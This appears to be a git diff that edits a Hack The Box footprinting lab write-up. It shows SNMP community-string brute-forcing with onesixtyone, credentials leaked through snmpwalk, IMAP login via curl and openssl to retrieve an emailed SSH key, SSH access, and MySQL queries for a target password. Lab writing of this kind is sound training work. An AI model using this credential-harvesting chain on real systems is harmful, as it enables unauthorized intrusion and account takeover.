@@ -81,7 +81,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 206.58 seconds
 ```
 
-here is a list of all open port services (TCP)
+Here is a list of all open port services (TCP)
 
 | Port | Details | Course |
 | ---  | ------- | ------|
@@ -95,14 +95,14 @@ here is a list of all open port services (TCP)
 
 ### SSH Enumeration
 
-To enumerate SSH, i used [ssh-audit](https://github.com/arthepsy/ssh-audit) tool.
+To enumerate SSH, I used the [ssh-audit](https://github.com/arthepsy/ssh-audit) tool.
 
-Clone it and change dir.
+Clone it and change to the directory.
 ```
 git clone https://github.com/arthepsy/ssh-audit.git && cd ssh-audit
 ```
 
-Run ssh-audit with target ip.
+Run ssh-audit with the target IP.
 ```
 ./ssh-audit.py 10.129.202.20
 ```
@@ -213,7 +213,7 @@ Run ssh-audit with target ip.
 (nfo) Potentially insufficient connection throttling detected, resulting in possible vulnerability to the DHEat DoS attack (CVE-2002-20001).  38 connections were created in 1.500 seconds, or 25.3 conns/sec; server must respond with a rate less than 20.0 conns/sec per IPv4/IPv6 source address to be considered safe.  For rate-throttling options, please see <https://www.ssh-audit.com/hardening_guides.html>.  Be aware that using 'PerSourceMaxStartups 1' properly protects the server from this attack, but will cause this test to yield a false positive.  Suppress this test and message with the --skip-rate-test option.
 ```
 
-From this output, we can learn some informations about ssh version,
+From this output, we can learn some information about the SSH version:
 ```
 # general
 (gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
@@ -222,13 +222,13 @@ From this output, we can learn some informations about ssh version,
 (gen) compression: enabled (zlib@openssh.com)
 ``` 
 
-There is also a possible vulnerability DHEat DoS attack.
+There is also a possible vulnerability to a DHEat DoS attack.
 
 **notes**: Our goal is to find the HTB user password, so the Denial of Service vulnerability is not useful in our case. However, in a real-world scenario, we would need to inform the client about this issue.
 
 ### IMAP/POP3 Enumeration
 
-For this part, i tried to connect into imaps and pop3s service to verify if the allow_anonymous setting was set. 
+For this part, I tried to connect to the imaps and pop3s services to verify if the allow_anonymous setting was enabled. 
 
 ```
 openssl s_client -connect 10.129.39.135:imaps
@@ -249,7 +249,7 @@ openssl s_client -connect 10.129.14.128:pop3s
 connect:errno=111
 ```
 
-At this moment, i was stuck on those results. And during the coffee break i remembered that agressive scan of nmap doesn't scan for UDP ports.
+At this moment, I was stuck on these results. During the coffee break, I remembered that the aggressive scan of nmap does not scan for UDP ports.
 
 ---
 
@@ -281,31 +281,44 @@ PORT      STATE  SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 4.68 seconds
 ```
 
-From this output we can see that only snmp port is open. 
+From this output, we can see that only the SNMP port is open. 
 
 ### SNMP Enumeration
 
 
+
+The command `snmpwalk` is a network reconnaissance tool used to query a device running the Simple Network Management Protocol (SNMP).
 ```
 snmpwalk -v2c -c public 10.129.202.20
 ```
+But there we can see that using public community string isn't working. (must be disabled by admin) 
 
 ```
 Timeout: No Response from 10.129.202.20
 ```
+To continue SNMP enumaration i used an another tool named onesixtyone.
 
+
+This tool is a SNMP scanner made for speed. It is used to perform a dictionary attack (brute-force) against the SNMP service.
 ```
 onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.197.149
 ```
+> -c is used to specify a specific wordlist (in this case we used seclists).
 
 ```
 Scanning 1 hosts, 3219 communities
 10.129.197.149 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
 ```
+At first, I didn't spot any "new" results in this output, but after looking at example outputs from onesixtyone, I found it.
 
+The wanted information is `[backup]` (It is the community string changed against public). 
+
+We can retry to connect to snmp with the new `[backup]` community string.
 ```
 snmpwalk -v2c -c backup 10.129.197.149
 ```
+> -v2c specifies the version of SNMP we want to use.
+
 
 ```iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
@@ -355,7 +368,7 @@ iso.3.6.1.2.1.25.1.6.0 = Gauge32: 158
 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
 iso.3.6.1.2.1.25.1.7.1.1.0 = INTEGER: 1
 iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
-iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
+iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761" # <- Likely crendentials
 iso.3.6.1.2.1.25.1.7.1.2.1.4.6.66.65.67.75.85.80 = ""
 iso.3.6.1.2.1.25.1.7.1.2.1.5.6.66.65.67.75.85.80 = INTEGER: 5
 iso.3.6.1.2.1.25.1.7.1.2.1.6.6.66.65.67.75.85.80 = INTEGER: 1
@@ -380,9 +393,13 @@ iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = No more variables left in t
 
 ### Exploit credentials
 
+With the new credentials in hand, we can try to use them with the imaps service.
+
 ```
 curl -k 'imaps://10.129.197.149' --user tom:NMds732Js2761 -v
 ```
+
+> -v is for verbose mode 
 
 ```
 *   Trying 10.129.197.149:993...
@@ -425,6 +442,10 @@ curl -k 'imaps://10.129.197.149' --user tom:NMds732Js2761 -v
 * Connection #0 to host 10.129.197.149 left intact
 ```
 
+Here we have successfully connected to imaps with Tom's account.
+We can see that a list of folders appears at the end of the output.
+
+So the next step is to connect to imaps to take a look inside these folders.
 ```
 openssl s_client -connect 10.129.197.149:imaps
 ```
@@ -551,15 +572,17 @@ SSL-Session:
 read R BLOCK
 * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
 ```
+After we connected with openssl to imaps, we must login with Tom account. 
 ```
-a login tom NMds732Js2761
+a1 login tom NMds732Js2761
 ```
+>This is a special syntax made for imaps
 ```
 a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
 ```
-
+Another method to list all IMAPS folders is to use `list`
 ```
-a list "" *
+a2 list "" *
 ```
 ```
 * LIST (\HasNoChildren) "." Notes
@@ -568,15 +591,16 @@ a list "" *
 * LIST (\HasNoChildren) "." INBOX
 a OK List completed (0.001 + 0.000 secs).
 ```
-
+For now, let's dive into these folders.
+`select` allows us to navigate into mailboxes.
 ```
-a select Important
+a3 select Important
 ```
 
 ```
 * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
 * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
-* 0 EXISTS
+* 0 EXISTS # <- here we can easily see that no files are inside.
 * 0 RECENT
 * OK [UIDVALIDITY 1636509062] UIDs valid
 * OK [UIDNEXT 1] Predicted next UID
@@ -584,21 +608,25 @@ a OK [READ-WRITE] Select completed (0.005 + 0.000 + 0.004 secs).
 ```
 
 ```
-a select INBOX
+a4 select INBOX
 ```
 
 ```
 * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
 * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
-* 1 EXISTS
+* 1 EXISTS # <- this one has one file.
 * 0 RECENT
 * OK [UIDVALIDITY 1636509064] UIDs valid
 * OK [UIDNEXT 2] Predicted next UID
 a OK [READ-WRITE] Select completed (0.008 + 0.000 + 0.007 secs).
 ```
 
+**Notes**: All mailboxes were empty except the INBOX folder.
+
+To read the file present, we can use the `fetch` command.
+> If we want to select more than 1 file, replace 1 with 1:5, 3:15, etc., if they exist.
 ```
-a fetch 1 BODY[]
+a5 fetch 1 BODY[]
 ```
 
 ```
@@ -663,10 +691,15 @@ XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
 )
 ```
 
+We found the ssh private key sent from admin to tom in them mailbox.
+
+
+To extract the key, let's create a file.
 ```
 touch sshkey_private
 ```
 
+And tried to use it with SSH.
 ```
 ssh -i sshkey_private tom@10.129.202.20
 ```
@@ -680,14 +713,19 @@ It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "sshkey_private": bad permissions
 ```
+SSH told us that our file has bad permissions (too insecure).
 
+The recommended permission for SSH is 600 because we want only the owner to be able to use it.
 ```
 sudo chmod 600 sshkey_private
 ```
 
+To modify the current protection passphrase for the private key, we can use `ssh-keygen`:
 ```
 ssh-keygen -p -f sshkey_private -m PEM
 ```
+> -p tells ssh-keygen to change the passphrase
+> -m is a security measure to ensure the file is in a good format.
 
 ```
 Key has comment 'tom@NIXHARD'
@@ -696,10 +734,12 @@ Enter same passphrase again:
 Your identification has been saved with the new passphrase.
 ```
 
+After working on our private key, we can retry to connect with `ssh`.
 ```
 ssh -i sshkey_private tom@10.129.202.20
 ```
 
+Enter the previously set passphrase.
 ```
 Enter passphrase for key 'sshkey_private': 
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
@@ -725,14 +765,16 @@ To check for new updates run: sudo apt update
 Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
 tom@NIXHARD:~$ 
 ```
+We are logged in via SSH to Tom's computer!
 
+To start, I'd like to take a look at Tom's bash history.
 ```
 history
 ```
 
 ```
-1  mysql -u tom -p
-    2  ssh-keygen -t rsa -b 4096
+    1  mysql -u tom -p # <- He has a MySQL account
+    2  ssh-keygen -t rsa -b 4096 # <- This is likely our key.
     3  ls
     4  ls -al
     5  cd .ssh/
@@ -745,7 +787,7 @@ history
    12  cd Important/
    13  ls
    14  set term=xterm
-   15  vim key
+   15  vim key # <- there is a key somewhere
    16  cat ~/.ssh/id_rsa
    17  vim key
    18  ls
@@ -788,6 +830,7 @@ history
    55  history
 ```
 
+We can take a look at the tom home with `tree` command
 ```
 tom@NIXHARD:~$ tree
 .
@@ -807,6 +850,7 @@ tom@NIXHARD:~$ tree
 5 directories, 7 files
 ```
 
+Let's try to grep to see if we can find an "HTB" occurrence.
 ```
 grep -ri "HTB" .
 ```
@@ -821,7 +865,7 @@ grep -ri "HTB" .
 ./.viminfo::%s/example.com/inlanefreight.htb/g
 ./.viminfo:|2,0,1636508569,,"%s/example.com/inlanefreight.htb/g"
 ```
-
+But not what we're looking for in these files.
 
 ```
 cat /etc/passwd | grep -i "HTB"
@@ -829,12 +873,13 @@ cat /etc/passwd | grep -i "HTB"
 
 no output
 
-
+After snooping around Tom's home, my next checkpoint was to connect to his MySQL account
 
 ```bash
 mysql -u tom -p
 ```
 
+I entered Tom's credentials and it worked!
 ```
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -852,6 +897,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 mysql> 
 ```
 
+Now we have access to Tom's MySQL. We can start by looking at all databases with `show databases;`
 
 ```
 mysql> show databases;
@@ -867,6 +913,7 @@ mysql> show databases;
 5 rows in set (0.01 sec)
 ```
 
+We want to find a specific user password, so let's `use users;` database. 
 ```
 mysql> use users;
 Reading table information for completion of table and column names
@@ -874,7 +921,7 @@ You can turn off this feature to get a quicker startup with -A
 
 Database changed
 ```
-
+To take a look inside the database, we have to know the column names, so we use `show columns from users;`.
 ```
 mysql> show columns from users;
 +----------+-------------+------+-----+---------+-------+
@@ -886,6 +933,9 @@ mysql> show columns from users;
 +----------+-------------+------+-----+---------+-------+
 3 rows in set (0.01 sec)
 ```
+Now we know that there are 3 columns: id, username, and password.
+
+We want to display (`SELECT`) all users named (`* FROM users WHERE username LIKE`) "HTB" 
 
 ```
 mysql> SELECT * FROM users WHERE username LIKE "HTB";
@@ -896,3 +946,5 @@ mysql> SELECT * FROM users WHERE username LIKE "HTB";
 +------+----------+------------------------------+
 1 row in set (0.01 sec)
 ```
+
+![success](https://github.com/ftTower/ftTower/blob/main/assets/Cybersec-Portfolio/Labs/HTB_A_FOOTPRINTING_LAB/part-3/success.png)
